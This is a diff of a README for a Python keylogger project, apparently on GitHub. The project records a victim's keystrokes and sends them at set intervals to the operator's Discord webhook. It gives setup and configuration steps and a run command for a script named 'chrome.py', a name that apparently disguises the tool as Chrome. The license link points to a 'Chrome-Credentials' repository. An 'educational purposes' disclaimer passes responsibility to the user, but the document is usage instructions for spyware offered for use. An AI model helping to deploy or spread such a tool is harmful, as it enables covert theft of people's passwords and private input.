@@ -1,21 +1,28 @@
-Keylogger
-=========
+<h1 align="center">NetGian Keylogger</h1>
 
-Simple keylogger who sends the information throught Discord webhooks. Only made for educational purposes!
+**Note:** \
+This script was made for educational purposes, therefor all consequences caused by your actions are your responsibility and accountability.
 
-## Requirements
-You need to install the pynput and dhooks module.
+## ⚙️ 〢 Setup
 ```
-pip3 install pynput
-pip3 install dhooks
+pip install -r requirements.txt
 ```
 
-## Usage
-Put your Discord webhook and the time interval.
-```
+## 🤖 〢 Usage
+This script sends keystrokes throught Discord webhooks.\\
+Open the script and change this variables to you personal configuration.
+```python
 WEBHOOK_URL = ""  # Put here your discord webhook url.
 INTERVAL = 60  # You'll get the info every 60 seconds.
 ```
+Once you saved your configuration, run the script
+```
+python chrome.py
+```
+This script sends keystrokes throught Discord webhooks.
 
-## Tested on:
+## 🔍 〢 Tested on:
 - Windows 10
+
+## 📜 〢 License
+This project is distributed under [GNU General Public License v3.0](https://github.com/netgian/Chrome-Credentials/blob/main/LICENSE) license.
